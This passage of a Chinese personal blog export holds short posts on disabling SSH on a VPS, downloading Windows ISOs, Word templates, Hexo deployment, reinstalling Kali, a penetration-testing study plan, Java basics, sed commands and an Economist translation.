<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# /etc/init.d/ssh restart</span><br><span class="line">[ ok ] Restarting ssh (via systemctl): ssh.service.</span><br></pre></td></tr></table></figure>
<p>但是又想了一下，ssh服务直接放到公网也是非常危险的，况且这个系统人家默认就没有开启ssh服务。暴力破解是不断地尝试root密码以及ssh端口，把ssh服务暴露在公网，就是给攻击者制造成功的机会。<br>干脆把ssh服务给关了，反正可以从网页的控制台登录到服务器。<br>输入命令<code>/etc/init.d/ssh stop</code>关闭ssh服务。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.vultrblog.com/vultr-modifies-the-ssh-port/.html">修改ssh端口的方法</a></p>
]]></content>
      <categories>
        <category>v2ray</category>
      </categories>
      <tags>
        <tag>v2ray</tag>
        <tag>ssh服务</tag>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title>怎么下载官方win10的安装镜像</title>
    <url>//posts/ZH-CN/download-windows10-iso-mirror.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>想装一个win10专业版的虚拟机 使用一下，win10的官方镜像还是去官网下载比较纯净。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="下载渠道"><a href="#下载渠道" class="headerlink" title="下载渠道"></a>下载渠道</h2><p>win10镜像官网下载地址：<a href="https://www.microsoft.com/zh-cn/software-download/windows10ISO/">https://www.microsoft.com/zh-cn/software-download/windows10ISO/</a><br>这个地址，要在手机端打开，才可以进入到iso镜像下载页面。<br>于是在PC浏览器设置为手机模式，任选一款手机型号，刷新页面即可进入iso镜像下载页面。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/06/29/image.png" alt="image.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/06/29/image954b028096a46b59.png" alt="image954b028096a46b59.png"></p>
<h2 id="下载工具"><a href="#下载工具" class="headerlink" title="下载工具"></a>下载工具</h2><p>测试了几款下载软件，最好用的是motrix。好用的定义：不用注册账号、下载速度快。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>参考了<a href="https://windows10.pro/microsoft-com-software-download-windows10-iso/">这篇文章</a></p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>win10官方iso镜像</tag>
      </tags>
  </entry>
  <entry>
    <title>开心的事-太喜欢绚丽的夜景了</title>
    <url>//posts/ZH-CN/Happy_Thing.html</url>
    <content><![CDATA[<h2 id="备忘"><a href="#备忘" class="headerlink" title="备忘"></a>备忘</h2><p>跷跷板很好玩，夜景很好看，其实就是在附近走了走，生活充满彩蛋，必须擦亮双眼。此时我所拥有的，我都特别珍惜，我所没有的，我充满热望。必须得经历一些矫情的时刻，才能够明白一些朴素的道理，才能够以轻松的心理状态生活。人生的主题，应该是学会生活。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="拍照水平不行，还是喜欢拍照"><a href="#拍照水平不行，还是喜欢拍照" class="headerlink" title="拍照水平不行，还是喜欢拍照"></a>拍照水平不行，还是喜欢拍照</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb3fqt72huj33a04dcnpg.jpg" alt="QQ图片20200120231537.jpg"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb3frjzfa4j33a04dcx6s.jpg" alt="QQ图片20200120231603.jpg"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb3frxsmc6j33a04dc4qt.jpg" alt="QQ图片20200120231608.jpg"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb3fsc2vs2j33a04dc1l0.jpg" alt="QQ图片20200120231612.jpg"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb3fsqg77wj34dc3a0b2e.jpg" alt="QQ图片20200120231616.jpg"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb3ft574lij34dc3a0e85.jpg" alt="QQ图片20200120231621.jpg"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb3ftm3ty9j34dc3a0qva.jpg" alt="QQ图片20200120231626.jpg"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb3fuakauoj34dc3a0hdx.jpg" alt="QQ图片20200120231631.jpg"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb3furkkhlj34dc3a0u10.jpg" alt="QQ图片20200120231635.jpg"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb3fv7nynxj33a04dc7wl.jpg" alt="QQ图片20200120231640.jpg"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb3fvjywitj33a04dchdw.jpg" alt="QQ图片20200120231645.jpg"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb3fvwt69pj33a04dcb2c.jpg" alt="QQ图片20200120231650.jpg"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb3fwc3akcj33a04dcb2d.jpg" alt="QQ图片20200120231655.jpg"></p>
]]></content>
      <categories>
        <category>开心的</category>
      </categories>
      <tags>
        <tag>开心的</tag>
        <tag>五颜六色的灯光</tag>
      </tags>
  </entry>
  <entry>
    <title>怎么制作word模板</title>
    <url>//posts/ZH-CN/word-template.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文记录制作word模板的方法以备忘。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="制作模板"><a href="#制作模板" class="headerlink" title="制作模板"></a>制作模板</h2><p>按照自己的需求，列出各级标题及意义，并设置好自己需要的格式。</p>
<h3 id="设置各级标题格式"><a href="#设置各级标题格式" class="headerlink" title="设置各级标题格式"></a>设置各级标题格式</h3><p>各级标题格式，主要包括字体、字号。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/22/image.png" alt="image.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/22/imagebf4ac89e35acc2de.png" alt="imagebf4ac89e35acc2de.png"></p>
<h3 id="设置多级列表"><a href="#设置多级列表" class="headerlink" title="设置多级列表"></a>设置多级列表</h3><p>为了使各级标题自动标号，我们设置多级列表。以下举例一级标题到三级标题的列表设置。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/22/image716f63755315f9b5.png" alt="image716f63755315f9b5.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/22/imagea96c791e0f0b6dd4.png" alt="imagea96c791e0f0b6dd4.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/22/image8689cc40083505e9.png" alt="image8689cc40083505e9.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/22/image71f80c6cedaf7713.png" alt="image71f80c6cedaf7713.png"></p>
<h3 id="设置正文格式"><a href="#设置正文格式" class="headerlink" title="设置正文格式"></a>设置正文格式</h3><p>提醒一下，设置字体格式时，需要设置两次。选择“中文”设置一次，选择“西文”设置一次。注意看最终的字体格式信息。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/22/imagea26468698c635c4c.png" alt="imagea26468698c635c4c.png"></p>
<h2 id="另存为模板"><a href="#另存为模板" class="headerlink" title="另存为模板"></a>另存为模板</h2><p>以上是简单模板，另存为dotx格式，就自动存到了word自定义模板库。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/22/image789c8eee1b129e50.png" alt="image789c8eee1b129e50.png"></p>
<h2 id="使用word模板"><a href="#使用word模板" class="headerlink" title="使用word模板"></a>使用word模板</h2><p>在创建新文档时，选择“个人”，即可看到自定义的模板，点击模板即可根据模板创建文档。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/22/image6c5758c07eb3cbdb.png" alt="image6c5758c07eb3cbdb.png"></p>
]]></content>
      <categories>
        <category>office</category>
      </categories>
      <tags>
        <tag>office</tag>
      </tags>
  </entry>
  <entry>
    <title>怎样把hexo博客同步部署到github和gitee</title>
    <url>//posts/ZH-CN/hexo-meanwhile-deploy-github-gitee.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然很早就设置了同步部署hexo博客到github和gitee，但是后来发现gitee上没有同步博客了。为啥？今天登录到gitee，才发现我并没有设置ssh公钥😓</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="同步部署到gitee"><a href="#同步部署到gitee" class="headerlink" title="同步部署到gitee"></a>同步部署到gitee</h2><p>将电脑的ssh公钥复制到gitee网站，设置ssh验证。我当前gitee和github都是用的ssh验证方式。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/06/21/imageaa5936e007c6a218.png" alt="imageaa5936e007c6a218.png"><br>hexo主配置文件（_config.yml）：<br><img src="https://v2ray.dana5haw.com:8008/images/2020/06/22/image.png" alt="image.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>参考了<a href="https://junqifu.github.io/article/1ff6794c/">这篇文章</a><br>以及<a href="https://blog.csdn.net/yakuaback/article/details/104513748">这篇文章</a>告诉我，gitee的博客需要我们去手动更新。</p>
<hr>
<p>Tips:</p>
<ol>
<li>hexo设置的同步部署，是同步部署到github仓库和gitee仓库</li>
<li>gitee不会自动更新我们的网站，我们部署了新的博客文章，需要到gitee去手动同步（感觉好麻烦哦，一点都不智能，应该有自动更新的简便方法(:</li>
</ol>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo博客</tag>
        <tag>同步部署</tag>
        <tag>github</tag>
        <tag>gitee</tag>
      </tags>
  </entry>
  <entry>
    <title>成功把kali机器搞死了</title>
    <url>//posts/ZH-CN/Kali_die.html</url>
    <content><![CDATA[<h2 id="WTF"><a href="#WTF" class="headerlink" title="WTF??"></a>WTF??</h2><p>为了弄wpscan，我给kali升级。也许是电脑性能不够，后面熄屏，我索性把机器down掉。没想到，成了这个样子……😭😭😭😭<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc11zfrgftj31f60u0wgc.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么办"><a href="#怎么办" class="headerlink" title="怎么办"></a>怎么办</h2><p>要不重新下载一个镜像吧，从头安装虚拟机。真是折腾啊……<br>从<a href="https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/#1572305786534-030ce714-cc3b">官网</a>下载种子文件，用迅雷下载。添加下载任务，用BT种子。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc12y9dawlj31f60u0n1t.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc12wy01opj31hc0u01kx.jpg" alt="image.png"></p>
<h2 id="怎么使用"><a href="#怎么使用" class="headerlink" title="怎么使用"></a>怎么使用</h2><p>把下载好的7z压缩包进行解压缩，过程有点漫长，耐心等待……<br>之后导入<code>.vmdx</code>这个后缀的文件到vmware，就可以登录使用了。默认账号密码是<code>kali/kali</code>。2020.1这个版本的kali看起来高端了不少啊。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc1458lvdnj31f60u0wpt.jpg" alt="image.png"><br>这个新版的kali还有好多的功能，之后再慢慢折腾吧……</p>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>把kali机器搞死了</tag>
        <tag>糗事</tag>
      </tags>
  </entry>
  <entry>
    <title>我的big plan</title>
    <url>//posts/ZH-CN/My_Big_Plan.html</url>
    <content><![CDATA[<h2 id="自己和自己谈谈"><a href="#自己和自己谈谈" class="headerlink" title="自己和自己谈谈"></a>自己和自己谈谈</h2><p>你想要升级，想要变得优秀，不要光想。首先，我要表扬你，因为你尚有这样的觉悟。但是仅仅有觉悟是不够的，你得行动起来。我知道你很擅长为自己开脱，为自己的不作为找借口。从现在起，你得明白，想法就像我们随意撒下的种子，我们的大脑时时刻刻都在运作（就连你睡着的时候，它都在胡思乱想），所以，你偶然灵机一动、灵光闪现，都是再正常不过的事情。世界上并不缺少这种乍现的灵光，每个人都有灵光乍现的时刻。因为你撒下了种子，不去播种，它只会烂在土壤里面，在它发臭的时候，才提醒你，原来曾经撒下过这样一颗种子啊，这时候除了哀悼，你还能做什么？此时，再说什么早知道就该怎样怎样的话，就太悲哀了。</p>
<p><escape> <span id="more"></span></escape></p>
<p>到底应该怎么做，你有没有想过，至少在脑海里描绘过这样的画面吧，种一朵漂亮的花，或者种一颗常青的树。可能就是一个大概的轮廓，你并不清楚这朵花是向日葵还是玫瑰，你也不知道这棵树是白杨还是榕树。有什么关系呢？没有人知道自己会种出什么，尽管我们都知道人固有一死，但总得在生命的过程中创造些什么吧。<br>我不知道自己会创造出什么，但是我相信，抱着创造的心态经历人生，会少一些遗憾。我知道我要跑完这段人生的路，这段不知长短的人生路，有终点。前面有上坡下坡、有笔直的路、有弯曲的路。但是无论前路如何，现在的路不能踏空。在现在这段路上，我要尽最大努力，种一朵花，就种烟花好了。花最经不得枯萎了。枯萎了烂在土壤，还发出恶臭，和曾经的美丽形成多么讽刺的对比。烟花就很好，要么绽放，要么死去。没有中间状态，就是这么果断。年轻人就别给自己留退路了吧。其实不管怎样，我们总是能向前走的，直到与死亡拥抱。</p>
<h2 id="2020年要做什么"><a href="#2020年要做什么" class="headerlink" title="2020年要做什么"></a>2020年要做什么</h2><p>说了一堆废话，才进入正题。不说废话能不能进入正题？不能。个性就是这样，必须要调整一番，给自己做点心理建设，才立得出flag。就像唱国歌之前，总得有一段国旗下的讲话。<br>这是个很宏大的主题，做什么。可做的事太多了，到底要选择哪些事来做。<br>我拖延的计划太多了，但是我不是一个轻易放弃的人。虽然拖，但是我心里总给这些僵尸留了位置，遇到契机，就会想起把他们激活。<br>说什么事业计划，总是显得太雄心壮志了，有种赴死沙场的凛然。我其实没有把事业放在特别特别重要的位置。也没有把成功放到多么重要的位置。我为之付诸努力的，都是那些通常意义上没有什么用的东西。在事业上拼搏，努力工作，换来一笔可自由支配的钱，做我喜欢做的事情，装装13，买点清闲。的确是这样啊，忙碌是为了积攒换取闲适的筹码，悲伤是为了积攒换取快乐的筹码。这么想的话，生活简直太美好了。你现在忙，你现在不快乐，你现在出卖健康，正是在为更好的生活做铺垫啊，所以不能敷衍应付现在失去的一切，一边失去，就在一边得到，多么有哲理的真理。所以，认真失去，失去得越认真，得到的越多。本能的欲望就是一个词，more。就认真地陷入欲望的漩涡吧。<br>现在正式进入正题。<br>我每一年的生日愿望都实现了，不知道是谁在帮我，哈哈哈。<br>2017年，我的愿望是：过计算机二级和CATTI二级笔译。<br>    2018年实现了愿望。<br>2018年，我的愿望是：把我的愿望送给我爱的人，家人健康，朋友顺利。<br>    2019年应该都实现了，我爱的人，包括家人，朋友都很好。身边的朋友运气都不错。<br>2019年，我的愿望是：生日进步。<br>    希望2020年我能帮助自己实现这个愿望。<br>废话又加了好大一段。现在真的进入正题了。</p>
<h2 id="主要是提升自己的level"><a href="#主要是提升自己的level" class="headerlink" title="主要是提升自己的level"></a>主要是提升自己的level</h2><p>学习，是永恒的主题。人生需要学习的东西太多。我也没有明确给自己定型，在学习上，我保持开放的心态。最近，应该是今年的主题，都将是技能学习。当然心灵的成长也需要修炼。总之，就是要啃些硬骨头，不能光吃自己喜欢的。<br>以下的宏伟计划，其实也是在补自己过去就挖下的坑。</p>
<ul>
<li>职业计划<ul>
<li>目标：踏入信息安全圈子，进入一个开放的平台。希望认识更多喜欢分享的人，分享生活、分享思考、分享成长、分享知识。把自己置身于年轻化的氛围。</li>
<li>职业：信息安全渗透工程师</li>
<li>发展道路：不知道以后会怎样，学习技能，只有技能才是武器，它能帮我实现不着边际的梦想。我从来不认为一个人能制定5年计划，5年时间太长了，世界变化太快了。做一年计划差不多能以此为行为规范，时刻提醒自己。</li>
</ul>
</li>
<li>斜杠计划<ul>
<li>目标：成为一个多元发展的人，不能把自己圈死在某一个点。试着发掘自己更多的潜能。</li>
<li>输出：<ul>
<li>微信公众号：每周一总结，总结自身状态，生活、情绪、成长、思考。主要这四方面的总结。坚持一年之后，尝试做自媒体。</li>
<li>博客：每日记录，记录学习过程，建立一套自己的索引系统，让博客成为第二大脑。</li>
</ul>
</li>
<li>输入：<ul>
<li>书：一周至少看一本杂书，就是非技能学习类的书籍。其实现在的情况是经常看杂书，没咋看正经的技能学习类书籍。</li>
<li>电影：一周看一部电影，不一定要多深刻的，随心情。</li>
</ul>
</li>
<li>记录：<ul>
<li>手账坚持每天写，每月做计划，做总结。</li>
</ul>
</li>
<li>可能会做：<ul>
<li>考CATTI口译二级（笔译考了之后都没咋管，如果我的确有学习渗透的天赋，我就去考口译二级）</li>
<li>考日语N2（基础都不咋会，先把大话讲在这儿）</li>
</ul>
</li>
</ul>
</li>
<li>健康计划<ul>
<li>目标：不能再做胖子了，绝对绝对不能。坚持跑步，健康饮食，少吃外卖。不把话说太绝，可能偶尔会吃。</li>
<li>锻炼：一周跑步20公里。注意保护膝盖。</li>
<li>饮食：尽量自己做饭做菜。</li>
<li>作息：宁愿早起，不要熬夜。早上6点起床，晚上11点尽量睡觉，睡了就乖乖闭上眼睛，放空大脑。睡不着的时候听纯音乐。</li>
</ul>
</li>
</ul>
<h2 id="待续"><a href="#待续" class="headerlink" title="待续"></a>待续</h2><p>这儿就写具体的计划安排。今天有点累了，明天继续写。主要写学习计划，在博客输出哪些东西。<br>大概是这样：</p>
<ul>
<li>渗透学习<ul>
<li>基础知识：<ul>
<li>python脚本</li>
<li>shell脚本</li>
<li>还有很多，但是今年主要把python和shell学到熟练应用的程度。</li>
</ul>
</li>
<li>漏洞原理学习：<ul>
<li>vulhub靶场</li>
<li>DVWA靶场</li>
<li>testfire靶站</li>
<li>还有很多可练习的地方，今年重点掌握sql语言和sql注入的原理、攻击手法、攻击工具。</li>
</ul>
</li>
<li>渗透测试实战：<ul>
<li>流程怎样</li>
<li>工具哪些</li>
<li>虽然脚本小子是个偏贬义的词，但是先成为一个会使用工具的人吧。但是还是有一颗造轮子的心哈。</li>
</ul>
</li>
<li>现在想到的就这些，也是基于个人情况做的计划。网上有很多学习规划及建议，现阶段我就这么定吧，以后慢慢调整。先做局部了解，再尝试宏观串接。<br>写到现在，脑袋差不多成糨糊状。总之，努力并坚持。我觉得自己是有天赋的。</li>
</ul>
</li>
</ul>
<hr>
<p>还是另写一篇，专门写学习计划。这篇的废话太多了。最近喜欢陈奕迅的歌，这段时间好好研究他的音乐。</p>
]]></content>
      <categories>
        <category>丧必读</category>
      </categories>
      <tags>
        <tag>big paln</tag>
      </tags>
  </entry>
  <entry>
    <title>我也画出了爱心</title>
    <url>//posts/ZH-CN/Graph_Love.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>黑苹果里面自带的软件Gragher很好用，可以画各种函数。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="我画的爱心"><a href="#我画的爱心" class="headerlink" title="我画的爱心"></a>我画的爱心</h2><p>爱心函数：<code>17x^2-16|x|y+17y^2=225</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrmczs49wj31f60qojvu.jpg" alt="image.png"></p>
]]></content>
      <categories>
        <category>好玩的</category>
      </categories>
      <tags>
        <tag>画图</tag>
        <tag>爱心函数</tag>
      </tags>
  </entry>
  <entry>
    <title>我的第一个java程序</title>
    <url>//posts/ZH-CN/My_First_Java.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一直叨叨了很久，要学习java编程。今天终于到了天时地利人和的时候，跟着<a href="https://www.liaoxuefeng.com">廖雪峰的博客</a>学小白教程，先入个门。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><ul>
<li>java安装<br>在<a href="https://www.oracle.com/technetwork/java/javase/downloads/index.html">oracle官网</a>下载并安装jdk13，安装完成之后，设置环境变量。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbziikvxsmj30it0iggm9.jpg" alt="image.png"></li>
<li>eclipse安装<br>eclipse是广泛使用的一个IDE环境，java编程用这个IDE比较普遍。<br>在<a href="https://www.eclipse.org/">eclipse官网</a>下载并安装软件，按照教程里面的方法设置一些选项。</li>
</ul>
<h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h2><p>学编程永远离不开的一句话「hello world」，虽然这句话一度让我觉得有点搞笑:_:</p>
<ul>
<li>来吧，第一个项目先建好。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbzircqhrgj31f60u0425.jpg" alt="image.png"></li>
<li>在src目录新建class<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbziscv2b4j31hc0u07as.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbziubeuudj30iw0kudgt.jpg" alt="image.png"></li>
<li>写第一个程序<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbziv7nfmmj31f60u0whg.jpg" alt="image.png"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>执行程序<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbziw2ng7bj31hc0u0dm0.jpg" alt="image.png"><br>输出结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbzixpv62kj31f60u00vv.jpg" alt="image.png"></li>
</ul>
]]></content>
      <categories>
        <category>java学习</category>
        <category>基础知识大漫灌</category>
      </categories>
      <tags>
        <tag>java入门</tag>
        <tag>eclipse基本使用</tag>
      </tags>
  </entry>
  <entry>
    <title>我走过的google地图</title>
    <url>//posts/ZH-CN/My_Footprint.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>轨迹—————–</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="行之所至"><a href="#行之所至" class="headerlink" title="行之所至"></a>行之所至</h2><iframe src="https://www.google.com/maps/d/embed?mid=1mZqM3qVg3yoWZ3dk_e5WlmMkq-TEh9vo" width="640" height="480"></iframe>
]]></content>
      <categories>
        <category>最熟悉的陌生人，让我好好了解一下你</category>
      </categories>
      <tags>
        <tag>google地图</tag>
      </tags>
  </entry>
  <entry>
    <title>批量替换shell脚本的特定字符串</title>
    <url>//posts/ZH-CN/Shell_Sub.html</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>nginx的配置文件upstream.conf的内容非常多，需要批量删除”weight=10”这串字符。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>使用sed命令。<br>举例：在命令行执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i &quot;s/weight=10//g&quot; upstream.conf //意思就是把upstream.conf文件的所有&quot;weight=10&quot;删除</span><br></pre></td></tr></table></figure>
<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>sed命令处理字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i &quot;s/str1/str2/g&quot; filename //将filename文件的所有str1替换为str2</span><br><span class="line">sed -i &#x27;s/^.....//g&#x27; filename //删除所有行前5个字符，.作为字符占位符</span><br><span class="line">sed -i &#x27;s/.....$//g&#x27; filename //删除所有行后5个字符，.作为字符占位符</span><br><span class="line">sed -i &#x27;/str1/d&#x27; filename //删除包含str1的行</span><br><span class="line">sed -i &#x27;/findstr/s/str1/str2/g&#x27; filename //找到包含findstr的行，并且将str1替换为str2</span><br></pre></td></tr></table></figure>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://blog.csdn.net/renhanchi/article/details/70575191">https://blog.csdn.net/renhanchi/article/details/70575191</a></p>
]]></content>
      <categories>
        <category>linux</category>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell脚本</tag>
        <tag>字符串替换</tag>
      </tags>
  </entry>
  <entry>
    <title>拔罐加强新冠疫苗吸收？这不是伪科学！</title>
    <url>//posts/ZH-CN/Espresso-Economics-Marathon-92day.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经济学人浓咖啡马拉松计划doing！第-92天。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="喝吧"><a href="#喝吧" class="headerlink" title="喝吧"></a>喝吧</h2><p>Old meets new: ancient “cupping” method boosts covid vaccines</p>
<p>新旧碰撞：传统“拔罐”加强新冠疫苗吸收</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/06/katherine-hanlon-Pdea8oxLHkU-unsplash.jpg" alt="katherine-hanlon-Pdea8oxLHkU-unsplash.jpg"></p>
<p>Pressing a suction cup to the skin to boost health may sound like pseudoscience.</p>
<p>将吸盘扣到皮肤上，这种保健方式听起来可能像是伪科学。</p>
<p>And to some scientists, “cupping” is just that: a form of quackery akin to acupuncture and bloodletting.</p>
<p>一些科学家认为，“拔罐”只不过是类似于针灸和放血的骗术。</p>
<p>But researchers reporting in the journal Science Advances have applied the ancient technique to covid-19 vaccine delivery with success.</p>
<p>但是Science Advances期刊的研究报告表明，已经将这种传统方式成功应用到新冠疫苗。</p>
<p>In experiments, rats were injected with pure SARS-CoV-2 DNA, which on its own quickly degrades in the body.</p>
<p>在实验中，单独注射SARS-CoV-2 DNA的小鼠，SARS-CoV-2 DNA在体内迅速就降解。</p>
<p>But following up the injection with moderate suction through a plastic cup induced the skin cells to absorb the DNA, triggering an immune response 100 times stronger than injection alone.</p>
<p>但是用一个适度吸力的塑料吸盘继续注射，以诱导皮肤细胞吸收DNA，这样触发的免疫反应比单独注射强100倍。</p>
<p>Based on these results, cupping has been incorporated into DNA-vaccine clinical trials.</p>
<p>基于以上研究结果，拔罐已经纳入到了DNA疫苗的临床试验。</p>
<p>These matter hugely because DNA vaccines, such as India’s ZyCoV-D, do not require constant refrigeration, and so are easier to roll out in poor countries.</p>
<p>这些试验影响深远，因为像印度ZyCoV-D这样的DNA疫苗不需要恒温冷藏，更易于推向贫穷国家市场。</p>
<p>This goes to show that scientists should take inspiration wherever they can get it; public health is no place for squeamishness.</p>
<p>这也说明了科学家应当随处攫取灵感，对于公共健康不应吹毛求疵。</p>
<p>去年做过一次拔罐+放血+刮痧，痛的不得了。再也不想体验了：（</p>
]]></content>
      <categories>
        <category>经济学人</category>
      </categories>
      <tags>
        <tag>I期马拉松</tag>
        <tag>经济学人</tag>
        <tag>浓咖啡</tag>
      </tags>
  </entry>
  <entry>
    <title>换了电脑怎样快速迁移hexo博客</title>
    <url>//posts/ZH-CN/change-PC-migrate-hexo-blog.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>换了电脑，怎么迁移hexo博客，在新电脑上面继续写博客？折腾半天，终于找到一个简单有效快速的方法。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="方法步骤"><a href="#方法步骤" class="headerlink" title="方法步骤"></a>方法步骤</h2><ol>
<li><p>在新电脑上面安装必备软件：git、nodejs、hexo。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/06/21/image.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo</span><br></pre></td></tr></table></figure>
</li>
<li><p>新电脑创建一个目录用来写博客。</p>
</li>
<li><p>接下来，把旧电脑上面博客目录的这几个文件/文件夹拷贝到新电脑的博客目录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_config.yml</span><br><span class="line">package.json</span><br><span class="line">scaffolds/</span><br><span class="line">source/</span><br><span class="line">themes/</span><br></pre></td></tr></table></figure></li>
<li><p>在新电脑的博客目录执行这几条命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install #安装依赖包</span><br><span class="line">npm install hexo-deployer-git --save #hexo部署工具</span><br><span class="line">npm install hexo-generator-sitemap --save #站点地图</span><br></pre></td></tr></table></figure></li>
<li><p>依次输入这两条命令，在浏览器输入<a href="http://localhost:4000即可本地测试博客迁移是否成功。">http://localhost:4000即可本地测试博客迁移是否成功。</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure></li>
<li><p>部署命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>最终参考<a href="https://wungjyan.github.io/2018/08/17/move-hexo/">这篇文章</a></p>
<hr>
<p>Tips：</p>
<ol>
<li>在没有本地测试博客是否迁移成功之前，一定不要<code>hexo d</code>部署。否则，将导致网站完全空白！</li>
<li>迁移博客一定不要在新电脑上面初始化<code>hexo init xxx</code>，切记！只需要拷贝迁移博客需要用到的文件/文件夹。</li>
</ol>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>迁移hexo博客</tag>
      </tags>
  </entry>
  <entry>
    <title>挑战万岁</title>
    <url>//posts/ZH-CN/challenge-i-am-coming.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>激起上进心的源头，其实是虚荣心。</p>
<p><escape> <span id="more"></span></escape></p>
